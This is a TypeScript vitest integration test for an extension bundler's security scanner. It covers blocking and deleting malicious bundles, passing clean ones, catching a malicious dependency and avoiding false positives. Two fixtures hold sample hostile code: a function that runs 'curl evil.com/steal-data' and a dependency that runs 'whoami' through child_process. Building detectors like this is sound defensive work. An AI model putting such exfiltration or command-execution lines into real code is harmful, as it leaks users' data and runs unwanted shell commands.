import { access, mkdir, mkdtemp, rm, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { bundleExtensionFromDirEffect } from "@/services/extension/bundler";
import { scanBundleEffect } from "@/services/extension/security-scan";
import { afterEach, beforeEach, describe, expect, it } from "vitest";
import { runEffect } from "../setup/effect-test-utils";

describe("Bundle Security Orchestration (Integration)", () => {
  let testDir: string;

  beforeEach(async () => {
    testDir = await mkdtemp(
      join(tmpdir(), `bundle-security-integration-${Date.now()}-`),
    );
  });

  afterEach(async () => {
    await rm(testDir, { recursive: true, force: true });
  });

  it("blocks deployment and deletes artifact when malicious code detected", async () => {
    // Create malicious extension
    const extDir = join(testDir, "evil-ext");
    await mkdir(extDir, { recursive: true });

    await writeFile(
      join(extDir, "package.json"),
      JSON.stringify({
        name: "evil-ext",
        version: "1.0.0",
        main: "index.ts",
      }),
    );

    await writeFile(
      join(extDir, "index.ts"),
      `
      import { exec } from 'child_process';
      export function hack() {
        exec('curl evil.com/steal-data');
      }
    `,
    );

    // Bundle extension (use blocks type since it imports node modules)
    const bundleResult = await runEffect(
      bundleExtensionFromDirEffect(extDir, {
        repoRoot: testDir,
        timestamp: new Date().toISOString().replace(/[:.]/g, "-"),
        extensionType: "blocks",
      }),
    );

    const artifactPath = bundleResult.artifactPath;

    // Post-bundle scan should block
    const scanResult = await runEffect(scanBundleEffect(artifactPath));
    expect(scanResult.blocked).toBe(true);

    // Simulate orchestrator: delete artifact on block
    await rm(artifactPath, { force: true }).catch(() => {});
    if (bundleResult.sourcemapPath) {
      await rm(bundleResult.sourcemapPath, { force: true }).catch(() => {});
    }

    // Verify artifact deleted
    await expect(access(artifactPath)).rejects.toThrow();
  });

  it("allows deployment when bundle is clean", async () => {
    const extDir = join(testDir, "safe-ext");
    await mkdir(extDir, { recursive: true });

    await writeFile(
      join(extDir, "package.json"),
      JSON.stringify({
        name: "safe-ext",
        version: "1.0.0",
        main: "index.ts",
      }),
    );

    await writeFile(
      join(extDir, "index.ts"),
      `
      export function greet(name: string) {
        return \`Hello, \${name}!\`;
      }
    `,
    );

    const bundleResult = await runEffect(
      bundleExtensionFromDirEffect(extDir, {
        repoRoot: testDir,
        timestamp: new Date().toISOString().replace(/[:.]/g, "-"),
      }),
    );
    const scanResult = await runEffect(
      scanBundleEffect(bundleResult.artifactPath),
    );

    expect(scanResult.blocked).toBe(false);
    expect(scanResult.findings).toHaveLength(0);

    // Artifact should NOT be deleted for clean bundles
    await expect(access(bundleResult.artifactPath)).resolves.toBeUndefined();
  });

  it("detects malicious dependency in bundled code", async () => {
    // Create extension that imports malicious dependency
    const extDir = join(testDir, "ext-with-bad-dep");
    await mkdir(extDir, { recursive: true });

    await writeFile(
      join(extDir, "package.json"),
      JSON.stringify({
        name: "ext-with-bad-dep",
        version: "1.0.0",
        main: "index.ts",
      }),
    );

    // Extension code looks safe, but imports malicious module
    await writeFile(
      join(extDir, "index.ts"),
      `
      import { dangerousFunction } from './malicious-dep';
      export { dangerousFunction };
    `,
    );

    await writeFile(
      join(extDir, "malicious-dep.ts"),
      `
      const child_process = require('child_process');
      export function dangerousFunction() {
        child_process.exec('whoami');
      }
    `,
    );

    // Use blocks type since it requires node module (child_process)
    const bundleResult = await runEffect(
      bundleExtensionFromDirEffect(extDir, {
        repoRoot: testDir,
        timestamp: new Date().toISOString().replace(/[:.]/g, "-"),
        extensionType: "blocks",
      }),
    );
    const scanResult = await runEffect(
      scanBundleEffect(bundleResult.artifactPath),
    );

    // Should detect child_process in bundled dependency
    expect(scanResult.blocked).toBe(true);
    expect(scanResult.findings.some((f) => f.ruleId === "SEC102")).toBe(true);
  });

  it("does NOT alert on legitimate base64/prototype usage (false positive test)", async () => {
    const extDir = join(testDir, "legit-ext");
    await mkdir(extDir, { recursive: true });

    await writeFile(
      join(extDir, "package.json"),
      JSON.stringify({
        name: "legit-ext",
        version: "1.0.0",
        main: "index.ts",
      }),
    );

    // Code that SHOULD NOT trigger alerts despite containing patterns
    await writeFile(
      join(extDir, "index.ts"),
      `
      // Legitimate base64 for image rendering (not code execution)
      export function renderLogo() {
        const imageData = atob('iVBORw0KGgoAAAANSUhEUgAAAAUA' + 
          'AAAFCAYAAACNbyblAAAAHElEQVQI12P4//8/w38GIAXDIBKE0DHxgljNBAAO9TXL0Y4OHwAAAABJRU5ErkJggg==');
        return imageData;
      }
      
      // Legitimate Buffer.from for file decoding (not code)
      export function decodeFile(base64Data: string) {
        return Buffer.from(base64Data, 'base64'); // Returns Buffer, not executed
      }
      
      // Legitimate __proto__ guard (comparison, not assignment)
      export function sanitizeObject(obj: any) {
        for (const key in obj) {
          if (key === '__proto__' || key === 'constructor') {
            continue; // Safe: comparison only
          }
        }
        return obj;
      }
      
      // Method named "exec" but NOT child_process (no import signal)
      export class TaskRunner {
        exec(command: string) {
          // Safe: just a method name, no process spawning
          console.log('Running task:', command);
        }
      }
    `,
    );

    const bundleResult = await runEffect(
      bundleExtensionFromDirEffect(extDir, {
        repoRoot: testDir,
        timestamp: new Date().toISOString().replace(/[:.]/g, "-"),
      }),
    );
    const scanResult = await runEffect(
      scanBundleEffect(bundleResult.artifactPath),
    );

    // Should NOT block - all patterns are legitimate usage
    expect(scanResult.blocked).toBe(false);

    // May have zero findings, or only low-severity warnings
    const blockingFindings = scanResult.findings.filter(
      (f) => f.severity === "block",
    );
    expect(blockingFindings).toHaveLength(0);
  });
});
